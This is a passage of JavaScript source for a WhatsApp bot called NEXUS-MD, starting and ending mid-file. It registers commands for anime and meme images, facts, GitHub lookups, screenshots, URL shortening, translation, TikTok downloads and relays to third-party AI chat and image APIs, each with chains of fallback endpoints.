    await sock.sendMessage(from, { text: `⏳ Fetching a waifu image...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/anime/waifu?apikey=gifted`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract image URL
      let imageUrl = data.result || data.url || data.image || data.data?.url || data.data?.result;

      if (!imageUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
        if (urlMatch) imageUrl = urlMatch[0];
      }

      if (!imageUrl) {
        throw new Error("Could not extract image URL from API response.");
      }

      // Send the image
      await sock.sendMessage(from, {
        image: { url: imageUrl },
        caption: `💕 *Waifu*\n\n✨ _Powered by NEXUS-MD_`
      });

    } catch (error) {
      console.error('Waifu error:', error);

      // Fallback: Waifu API (sfw/waifu)
      try {
        const fallbackRes = await fetch('https://api.waifu.pics/sfw/waifu');
        const fallbackData = await fallbackRes.json();

        if (fallbackData && fallbackData.url) {
          return await sock.sendMessage(from, {
            image: { url: fallbackData.url },
            caption: `💕 *Waifu (fallback)*\n\n✨ _Powered by NEXUS-MD_`
          });
        }
      } catch (fallbackErr) {}

      // Fallback: Another anime API
      try {
        const anotherRes = await fetch('https://nekos.life/api/v2/img/waifu');
        const anotherData = await anotherRes.json();

        if (anotherData && anotherData.url) {
          return await sock.sendMessage(from, {
            image: { url: anotherData.url },
            caption: `💕 *Waifu (fallback)*\n\n✨ _Powered by NEXUS-MD_`
          });
        }
      } catch (anotherErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Waifu Error: ${error.message || 'Could not fetch image.'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'github',
  category: 'INFO',
  description: 'Search GitHub user profiles',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ GitHub username?' });
    try {
      const res = await fetch(`${P_BASE}/search/github?apikey=${P_KEY}&query=${encodeURIComponent(text)}`);
      const data = await res.json();
      const v = data.result;
      if (!v) return sock.sendMessage(from, { text: '❌ User not found.' });
      const info = `👤 *User:* ${v.login}\n📂 *Repos:* ${v.public_repos}\n👥 *Followers:* ${v.followers}\n🔗 *Link:* ${v.html_url}`;
      await sock.sendMessage(from, { image: { url: v.avatar_url }, caption: info });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ GitHub Error: ' + e.message });
    }
  }
});

// ==========================================
//                TOOL COMMANDS
// ==========================================

register({
  name: 'ssweb',
  category: 'TOOLS',
  description: 'Screenshot of a website',
  async execute({ sock, from, args }) {
    if (!args[0]) return sock.sendMessage(from, { text: '❓ Provide URL.' });
    await sock.sendMessage(from, { image: { url: `${P_BASE}/tools/ssweb?apikey=${P_KEY}&url=${args[0]}` }, caption: '📸 Screenshot' });
  }
});

register({
  name: 'shorturl',
  category: 'TOOLS',
  description: 'Shorten a long URL',
  async execute({ sock, from, args }) {
    if (!args[0]) return sock.sendMessage(from, { text: '❓ Provide URL.' });
    try {
      const res = await fetch(`${P_BASE}/tools/tinyurl?apikey=${P_KEY}&url=${args[0]}`);
      const data = await res.json();
      if (!data.result) return sock.sendMessage(from, { text: '❌ Could not shorten that URL.' });
      await sock.sendMessage(from, { text: `🔗 *Shortened:* ${data.result}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Shorten Error: ' + e.message });
    }
  }
});

register({
  name: 'translate',
  category: 'TOOLS',
  description: 'Translate text to English',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ Text to translate?' });
    try {
      const res = await fetch(`${P_BASE}/tools/translate?apikey=${P_KEY}&query=${encodeURIComponent(text)}&lang=en`);
      const data = await res.json();
      if (!data.result) return sock.sendMessage(from, { text: '❌ Could not translate that text.' });
      await sock.sendMessage(from, { text: `🌍 *Translation:* ${data.result}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Translate Error: ' + e.message });
    }
  }
});

register({
  name: 'meme',
  aliases: ['memes', 'dank', 'funny'],
  category: 'TOOLS',
  description: 'Get a random meme from the internet',
  async execute({ sock, from, prefix, command }) {
    await sock.sendMessage(from, { text: `⏳ Fetching a meme...` });

    try {
      // Primary: OmegaTech API
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/meme`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract meme data from various formats
      let imageUrl = data.result?.url || data.result?.image || data.result?.img || 
                     data.url || data.image || data.img;
      let title = data.result?.title || data.title || '😂 Meme';
      let subreddit = data.result?.subreddit || data.subreddit || 'unknown';
      let upvotes = data.result?.upvotes || data.upvotes || '?';

      if (!imageUrl) {
        // Fallback: try to find any URL in the response
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
        if (urlMatch) imageUrl = urlMatch[0];
      }

      if (!imageUrl) {
        throw new Error("Could not extract meme image from API response.");
      }

      const caption = `😂 *${title}*\n\n📌 r/${subreddit}\n⬆️ ${upvotes} upvotes\n\n✨ _Powered by NEXUS-MD_`;

      await sock.sendMessage(from, {
        image: { url: imageUrl },
        caption: caption
      });

    } catch (error) {
      console.error('Meme error:', error);

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/tools/meme';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince`);
        const fallbackData = await fallbackRes.json();

        let fallbackImage = fallbackData.result?.url || fallbackData.result || fallbackData.url || fallbackData.image;

        if (fallbackImage) {
          return await sock.sendMessage(from, {
            image: { url: fallbackImage },
            caption: '😂 *Random Meme*\n\n✨ _Powered by NEXUS-MD_'
          });
        }
      } catch (fallbackErr) {
        // Silent fail
      }

      // Fallback: Reddit API directly
      try {
        const redditRes = await fetch('https://meme-api.com/gimme');
        const redditData = await redditRes.json();

        if (redditData && redditData.url) {
          const caption = `😂 *${redditData.title || 'Meme'}*\n\n📌 r/${redditData.subreddit || 'memes'}\n⬆️ ${redditData.ups || '?'} upvotes\n\n✨ _Powered by NEXUS-MD_`;

          return await sock.sendMessage(from, {
            image: { url: redditData.url },
            caption: caption
          });
        }
      } catch (redditErr) {
        // Silent fail
      }

      await sock.sendMessage(from, {
        text: `⚠️ Meme Error: ${error.message || 'Could not fetch meme.'}\n\n💡 Try again later.`
      });
    }
  }
});

register({
  name: 'waifu2',
  category: 'TOOLS',
  description: 'Random Waifu Anime Image',
  async execute({ sock, from }) {
    await sock.sendMessage(from, { image: { url: `${P_BASE}/anime/waifu?apikey=${P_KEY}` }, caption: '❤️' });
  }
});

register({
  name: 'fact',
  aliases: ['facts', 'didyouknow', 'trivia'],
  category: 'TOOLS',
  description: 'Get a random interesting fact',
  async execute({ sock, from, prefix, command }) {
    await sock.sendMessage(from, { text: `⏳ Fetching a fact...` });

    try {
      // Primary: OmegaTech API
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/fact`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract fact from various formats
      let fact = data.result || data.fact || data.text || data.message || data.data;

      if (!fact) {
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"fact":"([^"]+)"/) || 
                          jsonString.match(/"text":"([^"]+)"/) ||
                          jsonString.match(/"result":"([^"]+)"/);
        if (textMatch) fact = textMatch[1];
      }

      if (!fact) {
        throw new Error("Could not extract fact from API response.");
      }

      // Clean up the fact
      fact = fact.replace(/\\n/g, '\n').replace(/\\"/g, '"');

      // Split long facts into chunks if needed
      if (fact.length > 1000) {
        const chunks = fact.match(/.{1,1000}/g) || [fact];
        for (const chunk of chunks) {
          await sock.sendMessage(from, { text: `💡 *Did you know?*\n\n${chunk}` });
        }
      } else {
        await sock.sendMessage(from, { 
          text: `💡 *Did you know?*\n\n${fact}` 
        });
      }

    } catch (error) {
      console.error('Fact error:', error);

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/tools/fact';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince`);
        const fallbackData = await fallbackRes.json();

        let fallbackFact = fallbackData.result || fallbackData.fact || fallbackData.text;

        if (fallbackFact) {
          return await sock.sendMessage(from, { 
            text: `💡 *Did you know?*\n\n${fallbackFact}` 
          });
        }
      } catch (fallbackErr) {
        // Silent fail
      }

      // Fallback: Free API (Useless Facts)
      try {
        const uselessRes = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const uselessData = await uselessRes.json();

        if (uselessData && uselessData.text) {
          return await sock.sendMessage(from, { 
            text: `💡 *Did you know?*\n\n${uselessData.text}` 
          });
        }
      } catch (uselessErr) {
        // Silent fail
      }

      // Fallback: Another free API
      try {
        const anotherRes = await fetch('https://api.api-ninjas.com/v1/facts?limit=1', {
          headers: { 'X-Api-Key': 'your-key-here' } // Note: requires API key
        });
        // This one needs an API key, so skip if not configured
      } catch (anotherErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Fact Error: ${error.message || 'Could not fetch a fact.'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'gpt',
  aliases: ['ai', 'chatgpt', 'ask'],
  category: 'AI',
  description: 'Chat with ChatGPT AI assistant',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🤖 *GPT Assistant*\n\nUsage: ${prefix}${command} <your question>\nExample: ${prefix}${command} What is the capital of France?\n\n*Examples:*\n${prefix}${command} Write a poem about AI\n${prefix}${command} Explain quantum computing in simple terms\n${prefix}${command} Create a JavaScript function to reverse a string` 
      });
    }

    const query = args.join(" ");

    await sock.sendMessage(from, { text: `⏳ Thinking...` });

    try {
      // Primary: EliteProTech API
      const response = await fetch(
        `https://eliteprotech-apis.zone.id/chatgpt?prompt=${encodeURIComponent(query)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract response
      let reply = data.response || data.result || data.reply || data.message;

      if (!reply) {
        // Fallback: try to find any text in the response
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"response":"([^"]+)"/) || 
                          jsonString.match(/"result":"([^"]+)"/) ||
                          jsonString.match(/"reply":"([^"]+)"/) ||
                          jsonString.match(/"message":"([^"]+)"/);
        if (textMatch) reply = textMatch[1];
      }

      if (!reply) {
        throw new Error("Could not extract response from AI.");
      }

      // Clean up
      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"');

      // Truncate if too long
      if (reply.length > 65000) {
        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
      }

      // Send the response
      await sock.sendMessage(from, { 
        text: `🤖 *GPT:*\n\n${reply}` 
      });

    } catch (error) {
      console.error('GPT error:', error);

      // Fallback: OmegaTech API
      try {
        const omegaUrl = 'https://omegatech-api.dixonomega.tech/api/ai/gpt';
        const fallbackRes = await fetch(`${omegaUrl}?q=${encodeURIComponent(query)}`);
        const fallbackData = await fallbackRes.json();
        const fallbackReply = fallbackData.result || fallbackData.reply || fallbackData.message;

        if (fallbackReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${fallbackReply}` 
          });
        }
      } catch (fallbackErr) {}

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/ai/gpt';
        const princeRes = await fetch(`${princeUrl}?apikey=prince&query=${encodeURIComponent(query)}`);
        const princeData = await princeRes.json();
        const princeReply = princeData.result || princeData.reply || princeData.message;

        if (princeReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${princeReply}` 
          });
        }
      } catch (princeErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ GPT Error: ${error.message || 'Unknown error'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'tiktok',
  aliases: ['tt', 'ttdl', 'tiktokdl'],
  category: 'DOWNLOADER',
  description: 'Download TikTok videos (no watermark)',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📥 *TikTok Downloader*\n\nUsage: ${prefix}${command} <url>\nExample: ${prefix}${command} https://vm.tiktok.com/xxxxx/\n\n*Supported URLs:*\n• vm.tiktok.com\n• www.tiktok.com\n• tiktok.com` 
      });
    }

    const url = args[0];

    if (!url.includes('tiktok.com')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid TikTok link.\nExample: https://vm.tiktok.com/xxxxx/` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing TikTok video...` });

    try {
      // Primary: EliteProTech API
      const response = await fetch(
        `https://eliteprotech-apis.zone.id/tiktok?url=${encodeURIComponent(url)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract video URL and metadata
      let videoUrl = data.result?.video || data.result?.download_url || data.result?.url || 
                     data.video || data.download_url || data.url;
      let title = data.result?.title || data.title || data.caption || 'TikTok Video';
      let author = data.result?.author || data.author || data.username || 'Unknown';
      let duration = data.result?.duration || data.duration || 'N/A';
      let thumbnail = data.result?.thumbnail || data.thumbnail || data.cover || null;

      if (!videoUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"',]+\.(mp4|mov)/i);
        if (urlMatch) videoUrl = urlMatch[0];
      }

      if (!videoUrl) {
        throw new Error("Could not extract video URL from API response.");
      }

      // Send thumbnail if available
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `🎵 *${title}*\n👤 *Author:* ${author}\n⏱️ *Duration:* ${duration}s\n\n⬇️ *Downloading video...*`
          });
        } catch (thumbErr) {}
      }

      // Download and send the video
      const videoResponse = await fetch(videoUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!videoResponse.ok) {
        throw new Error(`Video download failed: ${videoResponse.status}`);
      }

      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

      if (videoBuffer.length < 5000) {
        throw new Error("Downloaded file is too small. The link may be invalid.");
      }

      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);

      try {
        await sock.sendMessage(from, {
          video: videoBuffer,
          mimetype: 'video/mp4',
          caption: `🎵 *${title}*\n👤 *Author:* ${author}\n⏱️ *Duration:* ${duration}s\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *TikTok Download Success*`
        });
      } catch (sendErr) {
        await sock.sendMessage(from, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `tiktok_${author}_${Date.now()}.mp4`,
          caption: `🎵 *${title}*\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB`
        });
      }

    } catch (error) {
      console.error('TikTok download error:', error);

      // Fallback: OmegaTech API
      try {
        const omegaUrl = 'https://omegatech-api.dixonomega.tech/api/download/tiktok';
        const fallbackRes = await fetch(`${omegaUrl}?url=${encodeURIComponent(url)}`);
        const fallbackData = await fallbackRes.json();

        let fallbackVideo = fallbackData.result?.video || fallbackData.result?.url || 
                            fallbackData.video || fallbackData.url;

        if (fallbackVideo) {
          const vRes = await fetch(fallbackVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, {
              video: vBuf,
              mimetype: 'video/mp4',
              caption: '🎵 *TikTok Video (fallback)*\n✅ *Download Success*'
            });
          }
        }
      } catch (fallbackErr) {}

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/tiktok';
        const princeRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}`);
        const princeData = await princeRes.json();

        let princeVideo = princeData.result?.video || princeData.result?.url || princeData.video || princeData.url;

        if (princeVideo) {
          const vRes = await fetch(princeVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, {
              video: vBuf,
              mimetype: 'video/mp4',
              caption: '🎵 *TikTok Video (fallback)*\n✅ *Download Success*'
            });
          }
        }
      } catch (princeErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Unknown error'}\n\n💡 Try again or use a different video link.` 
      });
    }
  }
});
register({
  name: 'letmegpt',
  aliases: ['giftedai', 'gptai'],
  category: 'AI',
  description: 'Chat with LetMeGPT AI from GiftedTech',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🤖 *LetMeGPT AI Assistant*\n\nUsage: ${prefix}${command} <your question>\nExample: ${prefix}${command} What is the capital of France?` 
      });
    }

    const query = args.join(" ");
    const apiKey = 'gifted'; // Public test key

    await sock.sendMessage(from, { text: `⏳ Thinking...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/ai/letmegpt?apikey=${apiKey}&q=${encodeURIComponent(query)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract response
      let reply = data.result || data.response || data.reply || data.message;

      if (!reply) {
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
                          jsonString.match(/"response":"([^"]+)"/) ||
                          jsonString.match(/"reply":"([^"]+)"/) ||
                          jsonString.match(/"message":"([^"]+)"/);
        if (textMatch) reply = textMatch[1];
      }

      // Handle null result
      if (!reply) {
        // Try alternative parameter name
        const altRes = await fetch(
          `https://api.giftedtech.co.ke/api/ai/letmegpt?apikey=${apiKey}&prompt=${encodeURIComponent(query)}`,
          {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          }
        );

        if (altRes.ok) {
          const altData = await altRes.json();
          reply = altData.result || altData.response || altData.reply || altData.message;
        }
      }

      if (!reply) {
        throw new Error("Could not extract response from LetMeGPT AI.");
      }

      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"');

      if (reply.length > 65000) {
        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
      }

      await sock.sendMessage(from, { 
        text: `🤖 *LetMeGPT:*\n\n${reply}` 
      });

    } catch (error) {
      console.error('LetMeGPT error:', error);

      // Fallback: EliteProTech ChatGPT API
      try {
        const eliteUrl = 'https://eliteprotech-apis.zone.id/chatgpt';
        const fallbackRes = await fetch(`${eliteUrl}?prompt=${encodeURIComponent(query)}`);
        const fallbackData = await fallbackRes.json();
        const fallbackReply = fallbackData.response || fallbackData.result || fallbackData.reply;

        if (fallbackReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${fallbackReply}` 
          });
        }
      } catch (fallbackErr) {}

      // Fallback: OmegaTech GPT
      try {
        const omegaUrl = 'https://omegatech-api.dixonomega.tech/api/ai/gpt';
        const omegaRes = await fetch(`${omegaUrl}?q=${encodeURIComponent(query)}`);
        const omegaData = await omegaRes.json();
        const omegaReply = omegaData.result || omegaData.reply || omegaData.message;

        if (omegaReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${omegaReply}` 
          });
        }
      } catch (omegaErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ LetMeGPT Error: ${error.message || 'Unknown error'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'flux',
  aliases: ['gf', 'giftedimg', 'fluxai'],
  category: 'AI',
  description: 'Generate AI images using GiftedTech Flux AI',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎨 *GiftedTech Flux AI Image Generator*\n\nUsage: ${prefix}${command} <description> [ratio]\nExample: ${prefix}${command} A futuristic city with neon lights\n\n*With ratio:*\n${prefix}${command} A beautiful landscape 16:9\n${prefix}${command} A portrait of a woman 9:16\n\n*Available ratios:*\n• 1:1 (square - default)\n• 16:9 (wide)\n• 9:16 (vertical)\n• 4:3 (standard)\n• 3:4 (portrait)\n\n*Tips for better results:*\n• Be descriptive\n• Include style (realistic, cartoon, anime, etc.)\n• Mention colors, lighting, mood` 
      });
    }

    let prompt = args[0];
    let ratio = '1:1';

    // Check if the last argument is a ratio
    const possibleRatios = ['1:1', '16:9', '9:16', '4:3', '3:4', '21:9'];
    if (args.length > 1 && possibleRatios.includes(args[args.length - 1])) {
      ratio = args[args.length - 1];
      prompt = args.slice(0, -1).join(' ');
    }

    const apiKey = 'gifted';

    await sock.sendMessage(from, { text: `🎨 *Generating image with Flux AI...*\n⏳ This may take 15-30 seconds...\n\n📝 *Prompt:* ${prompt}\n📐 *Ratio:* ${ratio}` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/ai/fluximg?apikey=${apiKey}&prompt=${encodeURIComponent(prompt)}&ratio=${encodeURIComponent(ratio)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract image URL
      let imageUrl = data.result?.url || data.url || data.image || data.result?.image;

      if (!imageUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
        if (urlMatch) imageUrl = urlMatch[0];
      }

      if (!imageUrl) {
        throw new Error("Could not extract image URL from API response.");
      }

      // Send the generated image
      await sock.sendMessage(from, {
        image: { url: imageUrl },
        caption: `🎨 *Flux AI Generated Image*\n\n📝 *Prompt:* ${prompt}\n📐 *Ratio:* ${ratio}\n\n✨ _Generated by GiftedTech Flux AI_`
      });

    } catch (error) {
      console.error('GiftedTech Flux error:', error);

      // Fallback: Try alternative GiftedTech endpoint
      try {
        const altUrl = 'https://api.giftedtech.co.ke/api/ai/flux';
        const altRes = await fetch(`${altUrl}?apikey=${apiKey}&prompt=${encodeURIComponent(prompt)}&ratio=${encodeURIComponent(ratio)}`);
        const altData = await altRes.json();

        let altImage = altData.result?.url || altData.url || altData.image;

        if (altImage) {
          return await sock.sendMessage(from, {
            image: { url: altImage },
            caption: `🎨 *Flux AI Generated Image (fallback)*\n\n📝 *Prompt:* ${prompt}\n📐 *Ratio:* ${ratio}`
          });
        }
      } catch (altErr) {}

      // Fallback: Try David Cyril Writecream
      try {
        const davidUrl = 'https://apis.davidcyril.name.ng/imagegen/writecream';
        const davidRes = await fetch(`${davidUrl}?prompt=${encodeURIComponent(prompt)}`);
        const davidData = await davidRes.json();

        let davidImage = davidData.result || davidData.url || davidData.image;

        if (davidImage) {
          return await sock.sendMessage(from, {
            image: { url: davidImage },
            caption: `🎨 *Writecream Generated Image (fallback)*\n\n📝 *Prompt:* ${prompt}`
          });
        }
      } catch (davidErr) {}

      // Fallback: Try Prince API Flux
      try {
        const princeUrl = 'https://api.princetechn.com/api/ai/flux';
        const princeRes = await fetch(`${princeUrl}?apikey=prince&prompt=${encodeURIComponent(prompt)}`);
        const princeData = await princeRes.json();

        let princeImage = princeData.result || princeData.url || princeData.image;

        if (princeImage) {
          return await sock.sendMessage(from, {
            image: { url: princeImage },
            caption: `🎨 *Flux AI Generated Image (fallback)*\n\n📝 *Prompt:* ${prompt}`
          });
        }
      } catch (princeErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Image Generation Error: ${error.message || 'Could not generate image.'}\n\n💡 Try a different prompt or try again later.` 
      });
    }
  }
});
register({
  name: 'unlimitedai',
  aliases: ['uai', 'unlimited'],
  category: 'AI',
  description: 'Chat with Unlimited AI from GiftedTech',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🤖 *Unlimited AI Assistant*\n\nUsage: ${prefix}${command} <your question>\nExample: ${prefix}${command} What is the capital of France?\n\n*Examples:*\n${prefix}${command} Write a poem about AI\n${prefix}${command} Explain quantum computing\n${prefix}${command} Create a JavaScript function\n\n*Features:*\n• Powered by GPT-4\n• No usage limits\n• Fast responses` 
      });
    }

    const query = args.join(" ");
    const apiKey = 'gifted';

    await sock.sendMessage(from, { text: `⏳ Thinking...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/ai/unlimitedai?apikey=${apiKey}&q=${encodeURIComponent(query)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract response
      let reply = data.result || data.response || data.reply || data.message;

      if (!reply) {
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
                          jsonString.match(/"response":"([^"]+)"/) ||
                          jsonString.match(/"reply":"([^"]+)"/) ||
                          jsonString.match(/"message":"([^"]+)"/);
        if (textMatch) reply = textMatch[1];
      }

      if (!reply) {
        // Try alternative parameter name
        const altRes = await fetch(
          `https://api.giftedtech.co.ke/api/ai/unlimitedai?apikey=${apiKey}&prompt=${encodeURIComponent(query)}`,
          {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          }
        );

        if (altRes.ok) {
          const altData = await altRes.json();
          reply = altData.result || altData.response || altData.reply || altData.message;
        }
      }

      if (!reply) {
        throw new Error("Could not extract response from Unlimited AI.");
      }

      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"');

      if (reply.length > 65000) {
        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
      }

      // Split into chunks if needed
      if (reply.length > 1000) {
        const chunks = reply.match(/.{1,1000}/g) || [reply];
        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
          const chunk = chunks[i];
          const prefix = i === 0 ? `🤖 *Unlimited AI:*\n\n` : `\n\n*Continued...*\n\n`;
          await sock.sendMessage(from, { text: prefix + chunk });
        }
      } else {
        await sock.sendMessage(from, { 
          text: `🤖 *Unlimited AI:*\n\n${reply}` 
        });
      }

    } catch (error) {
      console.error('Unlimited AI error:', error);

      // Fallback: EliteProTech ChatGPT API
      try {
        const eliteUrl = 'https://eliteprotech-apis.zone.id/chatgpt';
        const fallbackRes = await fetch(`${eliteUrl}?prompt=${encodeURIComponent(query)}`);
        const fallbackData = await fallbackRes.json();
        const fallbackReply = fallbackData.response || fallbackData.result || fallbackData.reply;

        if (fallbackReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${fallbackReply}` 
          });
        }
      } catch (fallbackErr) {}

      // Fallback: OmegaTech GPT
      try {
        const omegaUrl = 'https://omegatech-api.dixonomega.tech/api/ai/gpt';
        const omegaRes = await fetch(`${omegaUrl}?q=${encodeURIComponent(query)}`);
        const omegaData = await omegaRes.json();
        const omegaReply = omegaData.result || omegaData.reply || omegaData.message;

        if (omegaReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${omegaReply}` 
          });
        }
      } catch (omegaErr) {}

      // Fallback: Prince API GPT
      try {
        const princeUrl = 'https://api.princetechn.com/api/ai/gpt';
        const princeRes = await fetch(`${princeUrl}?apikey=prince&query=${encodeURIComponent(query)}`);
        const princeData = await princeRes.json();
        const princeReply = princeData.result || princeData.reply || princeData.message;

        if (princeReply) {
          return await sock.sendMessage(from, { 
            text: `🤖 *GPT (fallback):*\n\n${princeReply}` 
          });
        }
      } catch (princeErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Unlimited AI Error: ${error.message || 'Unknown error'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'quote',
  aliases: ['quotes', 'inspire', 'motivation'],
  category: 'TOOLS',
  description: 'Get a random inspirational quote',
  async execute({ sock, from, prefix, command }) {
    await sock.sendMessage(from, { text: `⏳ Fetching a quote...` });

    try {
      // Primary: OmegaTech API
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/quote`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract quote from various formats
      let quote = data.result?.quote || data.quote || data.text || data.message || data.data;
      let author = data.result?.author || data.author || data.by || 'Unknown';

      if (!quote) {
        const jsonString = JSON.stringify(data);
        const quoteMatch = jsonString.match(/"quote":"([^"]+)"/) || 
                           jsonString.match(/"text":"([^"]+)"/) ||
                           jsonString.match(/"message":"([^"]+)"/);
        if (quoteMatch) quote = quoteMatch[1];
        
        const authorMatch = jsonString.match(/"author":"([^"]+)"/) || 
                            jsonString.match(/"by":"([^"]+)"/);
        if (authorMatch) author = authorMatch[1];
      }

      if (!quote) {
        throw new Error("Could not extract quote from API response.");
      }

      // Clean up the quote
